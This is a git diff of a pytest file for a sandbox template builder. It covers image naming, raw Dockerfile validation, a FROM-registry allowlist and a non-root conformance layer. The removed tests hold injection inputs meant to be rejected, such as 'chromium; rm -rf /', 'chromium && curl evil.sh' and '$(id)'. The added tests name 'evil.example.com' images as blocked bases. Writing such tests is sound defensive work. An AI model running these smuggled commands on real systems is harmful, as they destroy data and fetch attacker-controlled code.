@@ -1,7 +1,5 @@
 from __future__ import annotations
 
-import json
-
 import pytest
 from pydantic import ValidationError
 
@@ -11,36 +9,13 @@ from harborbox.templates import (
     TemplateSpec,
     TemplateSpecError,
     render_dockerfile,
-    split_npm_package,
     validate_template_spec,
 )
-
-
-def spec_for(settings: Settings, **overrides: object) -> TemplateSpec:
-    payload: dict[str, object] = {
-        "base": "relaydeck",
-        "apt": [],
-        "npm": [],
-        "env": {},
-    }
-    payload.update(overrides)
-    return validate_template_spec(settings, **payload)  # type: ignore[arg-type]
 
 
 def test_template_is_mandatory() -> None:
     with pytest.raises(ValidationError):
         SandboxCreate.model_validate({})
-
-
-def test_template_defaults_are_profile_specific() -> None:
-    settings = Settings()
-
-    assert settings.resources_for_template("relaydeck") == (256, 0.5)
-    # 1.0 CPU, not 2.0: measured against the real analysis workload, DuckDB
-    # profiling of a CSV finished in ~2.5s at 1.0 CPU and the run was dominated
-    # by the model, not compute. Halving it doubles how many sandboxes fit.
-    assert settings.resources_for_template("onvo-pro") == (1024, 1.0)
-    assert settings.resources_for_template("onvo-lite") == (1024, 1.0)
 
 
 def test_unregistered_template_has_no_generic_fallback() -> None:
@@ -55,269 +30,213 @@ def test_unregistered_template_has_no_generic_fallback() -> None:
 
 def test_warm_pool_must_fit_configured_memory_budget() -> None:
     with pytest.raises(ValidationError, match="warm pool exceeds"):
-        Settings(sandbox_memory_budget_mb=1024)
+        Settings(sandbox_memory_budget_mb=256, warm_pool={"base": 8})
 
 
-def test_derived_image_name_is_a_pure_function_of_the_template_name() -> None:
-    settings = Settings()
+def test_push_and_pull_references_differ_only_in_the_registry_host() -> None:
+    """The builder and the sandbox runtime address one repository by two names.
 
-    assert settings.base_of_derived_template("relaydeck-a1b2c3d4e5f6") == "relaydeck"
-    assert settings.base_of_derived_template("onvo-pro-a1b2c3d4e5f6") == "onvo-pro"
+    BuildKit dials the registry from inside the build network; the Docker
+    daemon pulls it from the host. Those are different addresses for the same
+    store, and a registry does not care about the host part of a reference --
+    but the repository path after it must match exactly, or the build succeeds
+    and the sandbox create that follows fails on a missing image.
+    """
+    settings = Settings(
+        registry_push_endpoint="registry:5000",
+        registry_pull_endpoint="127.0.0.1:5050",
+        template_version="2026.08.03",
+    )
+    name = "custom-a1b2c3d4e5f6"
+
+    push = settings.push_image_for_template(name)
+    pull = settings.image_for_template(name)
+
+    assert push == "registry:5000/harborbox-sandbox-custom-a1b2c3d4e5f6:2026.08.03"
+    assert pull == "127.0.0.1:5050/harborbox-sandbox-custom-a1b2c3d4e5f6:2026.08.03"
+    assert push.split("/", 1)[1] == pull.split("/", 1)[1]
+
+
+def test_static_templates_are_addressed_through_the_registry_too() -> None:
+    """The endpoint prefixes the configured reference; it does not recompute it.
+
+    `HARBORBOX_RELAYDECK_IMAGE` and friends stay authoritative for the
+    repository path and tag, so pointing a deployment at a registry does not
+    silently rename the images it was already pinned to.
+    """
+    settings = Settings(
+        registry_pull_endpoint="127.0.0.1:5050",
+        base_image="harborbox-sandbox-base:2026.08.03",
+    )
+
     assert (
-        settings.image_for_template("relaydeck-a1b2c3d4e5f6")
-        == "harborbox-sandbox-relaydeck-a1b2c3d4e5f6:local"
+        settings.image_for_template("base")
+        == "127.0.0.1:5050/harborbox-sandbox-base:2026.08.03"
     )
-    # A derived template inherits its base's sizing unless the registry overrides it.
-    assert settings.resources_for_template("relaydeck-a1b2c3d4e5f6") == (256, 0.5)
 
 
-@pytest.mark.parametrize(
-    "name",
-    [
-        "relaydeck-a1b2c3d4e5",  # too short
-        "relaydeck-a1b2c3d4e5f6a",  # too long
-        "relaydeck-A1B2C3D4E5F6",  # not lowercase hex
-        "relaydeck-g1b2c3d4e5f6",  # not hex
-        "unknown-a1b2c3d4e5f6",  # unknown base
-        "relaydeck",  # a static template, not a derived one
-    ],
-)
-def test_malformed_derived_names_are_not_treated_as_derived(name: str) -> None:
-    assert Settings().base_of_derived_template(name) is None
-
-
-def test_spec_hash_is_deterministic_and_order_independent() -> None:
+def test_without_a_registry_images_keep_their_local_daemon_names() -> None:
+    """The registry is opt-in; an unconfigured deployment still builds locally."""
     settings = Settings()
 
-    first = spec_for(
-        settings,
-        apt=["fonts-liberation", "chromium"],
-        npm=["@playwright/mcp@0.0.78"],
-        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
+    assert (
+        settings.image_for_template("custom-a1b2c3d4e5f6")
+        == "harborbox-sandbox-custom-a1b2c3d4e5f6:local"
     )
-    second = spec_for(
-        settings,
-        apt=["chromium", "chromium", "fonts-liberation"],
-        npm=["@playwright/mcp@0.0.78", "@playwright/mcp@0.0.78"],
-        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
+    assert (
+        settings.push_image_for_template("custom-a1b2c3d4e5f6")
+        == "harborbox-sandbox-custom-a1b2c3d4e5f6:local"
     )
 
-    spec_hash_length = 12
-    assert first.apt == ("chromium", "fonts-liberation")
+
+RAW = "FROM debian:bookworm-slim\nRUN apt-get update && apt-get install -y jq\n"
+SPEC_HASH_LENGTH = 12
+
+
+def raw_settings(**overrides: object) -> Settings:
+    return Settings(**overrides)  # type: ignore[arg-type]
+
+
+def test_a_raw_dockerfile_names_itself_from_its_own_digest() -> None:
+    """A Dockerfile with no base template is not derived from anything.
+
+    `<base>-<hash>` would be a lie, so it gets its own namespace. The hash is
+    still the whole identity, which is what keeps the endpoint idempotent.
+    """
+    spec = validate_template_spec(raw_settings(), dockerfile=RAW)
+
+    assert spec.dockerfile == RAW
+    assert spec.name == f"custom-{spec.spec_hash}"
+    assert len(spec.spec_hash) == SPEC_HASH_LENGTH
+
+
+def test_an_identical_dockerfile_is_the_same_template() -> None:
+    settings = raw_settings()
+
+    first = validate_template_spec(settings, dockerfile=RAW)
+    second = validate_template_spec(settings, dockerfile=RAW)
+    different = validate_template_spec(settings, dockerfile=RAW + "RUN true\n")
+
     assert first.spec_hash == second.spec_hash
-    assert first.name == f"relaydeck-{first.spec_hash}"
-    assert len(first.spec_hash) == spec_hash_length
+    assert first.spec_hash != different.spec_hash
 
 
-def test_canonical_json_matches_the_published_contract() -> None:
-    spec = spec_for(
-        Settings(),
-        apt=["chromium"],
-        npm=["@playwright/mcp@0.0.78"],
-        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
-    )
+def test_a_raw_dockerfile_round_trips_through_its_stored_json() -> None:
+    """The spec column is what a rebuild reads, so it has to survive the trip."""
+    spec = validate_template_spec(raw_settings(), dockerfile=RAW)
 
-    assert spec.canonical_json() == json.dumps(
-        {
-            "apt": ["chromium"],
-            "base": "relaydeck",
-            "env": {"PLAYWRIGHT_BROWSERS_PATH": "0"},
-            "npm": ["@playwright/mcp@0.0.78"],
-        },
-        separators=(",", ":"),
-        sort_keys=True,
-    )
+    restored = TemplateSpec.from_json(spec.as_json())
+
+    assert restored == spec
+    assert restored.name == spec.name
 
 
-def test_resource_overrides_do_not_change_the_spec_hash() -> None:
-    settings = Settings()
+def test_from_lines_must_name_an_allowlisted_registry() -> None:
+    """The one control that still means something once arbitrary RUN exists.
 
-    # Resource overrides are not part of the spec and never reach TemplateSpec,
-    # so two teams differing only in sizing still share one image.
-    assert spec_for(settings, apt=["chromium"]).spec_hash == spec_for(
-        settings, apt=["chromium"]
-    ).spec_hash
+    Everything a build installs is unbounded by construction; what it *starts
+    from* is not, and that is the difference between "any Dockerfile" and "any
+    Dockerfile beginning at an image we vetted".
+    """
+    settings = raw_settings(template_from_allowlist=["docker.io/library"])
 
+    ok = validate_template_spec(settings, dockerfile="FROM docker.io/library/debian:12\n")
+    assert ok.dockerfile
 
-def test_an_empty_spec_resolves_to_the_base_template() -> None:
-    spec = spec_for(Settings())
-
-    assert spec.is_empty is True
-    assert spec.name == "relaydeck"
-
-
-def test_a_spec_round_trips_through_its_stored_json() -> None:
-    spec = spec_for(
-        Settings(),
-        apt=["chromium"],
-        npm=["@playwright/mcp"],
-        env={"PLAYWRIGHT_BROWSERS_PATH": "0"},
-    )
-
-    assert TemplateSpec.from_json(spec.as_json()).spec_hash == spec.spec_hash
-
-
-@pytest.mark.parametrize(
-    "package",
-    [
-        "chromium; rm -rf /",
-        "chromium && curl evil.sh",
-        "chromium$(id)",
-        "chromium`id`",
-        "chromium\nfonts-liberation",
-        "--allow-downgrades",
-        "chromium ",
-        "chromium|tee",
-        "chrómium",
-        "chromium\x00",
-        "",
-    ],
-)
-def test_apt_package_metacharacters_are_rejected(package: str) -> None:
-    with pytest.raises(TemplateSpecError):
-        spec_for(Settings(), apt=[package])
-
-
-def test_seeded_apt_allowlist_only_contains_debian_bookworm_names() -> None:
-    # `font-noto` is an Alpine name and does not exist on bookworm, which is what
-    # every static base image is built from.
-    allowlist = Settings().template_apt_allowlist
-
-    assert "font-noto" not in allowlist
-    assert "fonts-noto-core" in allowlist
-    assert {"chromium", "fonts-liberation"} <= allowlist
-
-
-def test_apt_packages_must_be_allowlisted_even_when_well_formed() -> None:
     with pytest.raises(TemplateSpecError, match="not allowlisted"):
-        spec_for(Settings(), apt=["build-essential"])
-
-    assert spec_for(
-        Settings(template_apt_allowlist=frozenset({"build-essential"})),
-        apt=["build-essential"],
-    ).apt == ("build-essential",)
+        validate_template_spec(settings, dockerfile="FROM evil.example.com/x:1\n")
 
 
-@pytest.mark.parametrize(
-    "package",
-    [
-        "@playwright/mcp@0.0.78; id",
-        "@playwright/mcp@$(id)",
-        "@playwright/mcp@0.0.78 --foo",
-        "../@playwright/mcp",
-        "@playwright/mcp@0.0.78@extra",
-        "@Playwright/MCP",
-    ],
-)
-def test_npm_specifier_metacharacters_and_shapes_are_rejected(package: str) -> None:
-    with pytest.raises(TemplateSpecError):
-        spec_for(Settings(), npm=[package])
+def test_the_implicit_docker_hub_prefix_is_resolved_before_matching() -> None:
+    """`FROM debian:12` and `FROM docker.io/library/debian:12` are one image.
 
+    Matching the raw text would let the short form slip past an allowlist that
+    only names the long one.
+    """
+    settings = raw_settings(template_from_allowlist=["docker.io/library"])
 
-def test_npm_allowlist_matches_the_package_not_the_pinned_version() -> None:
-    settings = Settings()
+    assert validate_template_spec(settings, dockerfile="FROM debian:12\n").dockerfile
 
-    assert spec_for(settings, npm=["@playwright/mcp@0.0.78"]).npm == (
-        "@playwright/mcp@0.0.78",
-    )
     with pytest.raises(TemplateSpecError, match="not allowlisted"):
-        spec_for(settings, npm=["left-pad@1.3.0"])
+        validate_template_spec(settings, dockerfile="FROM someuser/debian:12\n")
 
 
-def test_npm_specifiers_split_on_the_version_separator() -> None:
-    assert split_npm_package("@playwright/mcp@0.0.78") == ("@playwright/mcp", "0.0.78")
-    assert split_npm_package("@playwright/mcp") == ("@playwright/mcp", None)
-    assert split_npm_package("left-pad@1.3.0") == ("left-pad", "1.3.0")
-
-
-def test_list_lengths_are_capped() -> None:
-    settings = Settings(template_max_apt_packages=2, template_max_npm_packages=1)
-
-    with pytest.raises(TemplateSpecError, match="at most 2 apt packages"):
-        spec_for(settings, apt=["chromium", "fonts-noto-core", "redis-tools"])
-    with pytest.raises(TemplateSpecError, match="at most 1 npm packages"):
-        spec_for(settings, npm=["@playwright/mcp", "@playwright/mcp@1"])
-
-
-@pytest.mark.parametrize(
-    "name",
-    ["lowercase", "1LEADING_DIGIT", "HAS-DASH", "HAS SPACE", "TOO_LONG" + "G" * 64, ""],
-)
-def test_environment_variable_names_must_match_the_contract(name: str) -> None:
-    with pytest.raises(TemplateSpecError, match="environment variable name"):
-        spec_for(Settings(), env={name: "value"})
-
-
-def test_environment_variables_are_capped_in_count_and_size() -> None:
-    settings = Settings(template_max_env_vars=1, template_max_env_value_length=4)
-
-    with pytest.raises(TemplateSpecError, match="at most 1 environment"):
-        spec_for(settings, env={"ONE": "a", "TWO": "b"})
-    with pytest.raises(TemplateSpecError, match="exceeds 4 characters"):
-        spec_for(settings, env={"ONE": "abcde"})
-    with pytest.raises(TemplateSpecError, match="control or non-ASCII"):
-        spec_for(settings, env={"ONE": "a\nb"})
-
-
-def test_the_base_must_be_a_statically_registered_template() -> None:
-    with pytest.raises(TemplateSpecError, match="unknown base template"):
-        spec_for(Settings(), base="relaydeck-a1b2c3d4e5f6", apt=["chromium"])
-    with pytest.raises(TemplateSpecError, match="unknown base template"):
-        spec_for(Settings(), base="nonsense", apt=["chromium"])
-
-
-def test_generated_dockerfile_reacquires_and_drops_root() -> None:
-    spec = spec_for(
-        Settings(),
-        apt=["chromium", "fonts-liberation"],
-        npm=["@playwright/mcp@0.0.78"],
-        env={"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"},
+def test_every_from_line_is_checked_not_just_the_first() -> None:
+    """A multi-stage build has more than one entry point into the image."""
+    settings = raw_settings(template_from_allowlist=["docker.io/library"])
+    dockerfile = (
+        "FROM debian:12 AS build\n"
+        "RUN true\n"
+        "FROM evil.example.com/base:1\n"
+        "COPY --from=build /x /x\n"
     )
 
-    dockerfile = render_dockerfile(
-        base_image="harborbox-sandbox-relaydeck:local", spec=spec
-    )
-    lines = dockerfile.splitlines()
-
-    assert lines[0] == "FROM harborbox-sandbox-relaydeck:local"
-    assert lines[1] == "USER root"
-    assert lines[-1] == "USER 10001:10001"
-    assert "apt-get install -y --no-install-recommends" in dockerfile
-    assert "npm install --global --no-audit --no-fund" in dockerfile
-    assert "npm cache clean --force" in dockerfile
-    assert 'ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD="1"' in dockerfile
+    with pytest.raises(TemplateSpecError, match="not allowlisted"):
+        validate_template_spec(settings, dockerfile=dockerfile)
 
 
-def test_generated_dockerfile_sets_env_before_the_install_layers() -> None:
-    # PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD only suppresses Playwright's browser
-    # download if it is already set when `npm install -g` runs. An ENV emitted
-    # after the npm layer would silently do nothing.
-    spec = spec_for(
-        Settings(),
-        apt=["chromium"],
-        npm=["@playwright/mcp@0.0.78"],
-        env={"PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD": "1"},
+def test_a_named_build_stage_is_not_mistaken_for_a_registry() -> None:
+    """`FROM build` refers to an earlier stage, not to something to pull."""
+    settings = raw_settings(template_from_allowlist=["docker.io/library"])
+    dockerfile = "FROM debian:12 AS build\nRUN true\nFROM build\nRUN true\n"
+
+    assert validate_template_spec(settings, dockerfile=dockerfile).dockerfile
+
+
+def test_the_base_image_is_always_buildable_from() -> None:
+    """A product must be able to start from the image this repo ships."""
+    settings = raw_settings(registry_push_endpoint="registry:5000")
+
+    spec = validate_template_spec(
+        settings, dockerfile="FROM registry:5000/harborbox-sandbox-base:local\n"
     )
 
-    dockerfile = render_dockerfile(base_image="base:local", spec=spec)
-    instructions = [
-        line.split()[0]
-        for line in dockerfile.splitlines()
-        if line and not line.startswith((" ", "\t"))
-    ]
-
-    assert instructions == ["FROM", "USER", "ENV", "RUN", "RUN", "USER"]
-    assert dockerfile.index("ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD") < dockerfile.index(
-        "apt-get"
-    )
-    assert dockerfile.index("ENV PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD") < dockerfile.index(
-        "npm install"
-    )
+    assert spec.dockerfile
 
 
-def test_generated_dockerfile_neutralises_env_value_expansion() -> None:
-    spec = spec_for(Settings(), env={"TOKEN": 'a"b$HOME'})
+def test_a_dockerfile_must_contain_at_least_one_from() -> None:
+    with pytest.raises(TemplateSpecError, match="FROM"):
+        validate_template_spec(raw_settings(), dockerfile="RUN echo hello\n")
 
-    dockerfile = render_dockerfile(base_image="base:local", spec=spec)
 
-    assert 'ENV TOKEN="a\\"b\\$HOME"' in dockerfile
+def test_a_dockerfile_is_capped_in_size_and_instruction_count() -> None:
+    settings = raw_settings(template_max_dockerfile_bytes=256)
+
+    with pytest.raises(TemplateSpecError, match="bytes"):
+        validate_template_spec(settings, dockerfile="FROM debian:12\n" + "RUN true\n" * 100)
+
+    small = raw_settings(template_max_dockerfile_instructions=2)
+    with pytest.raises(TemplateSpecError, match="instructions"):
+        validate_template_spec(small, dockerfile="FROM debian:12\nRUN a\nRUN b\nRUN c\n")
+
+
+def test_a_raw_dockerfile_is_emitted_verbatim_then_made_conformant() -> None:
+    """The caller's file is theirs; the trailing contract is ours.
+
+    Harborbox's equivalent of E2B injecting envd. Whatever the caller wrote,
+    the image has to end up with uid 10001 owning a writable /workspace, or a
+    sandbox created from it cannot write its own working directory.
+    """
+    caller = "FROM debian:bookworm-slim\nRUN apt-get update\nUSER nobody\n"
+
+    rendered = render_dockerfile(caller)
+
+    assert rendered.startswith(caller)
+    body = rendered[len(caller) :]
+    assert "USER root" in body
+    assert "10001" in body
+    assert "/workspace" in body
+    # Ours wins: a caller's own trailing USER must not decide who the sandbox
+    # runs as.
+    assert rendered.rstrip().endswith("USER 10001:10001")
+
+
+def test_the_conformance_layer_tolerates_a_base_that_already_conforms() -> None:
+    """Our own static bases already have the user; adding it twice must not fail.
+
+    `useradd` exits non-zero when the user exists, which would turn "built on a
+    Harborbox base" into a build failure.
+    """
+    rendered = render_dockerfile("FROM debian:12\n")
+
+    assert "getent" in rendered
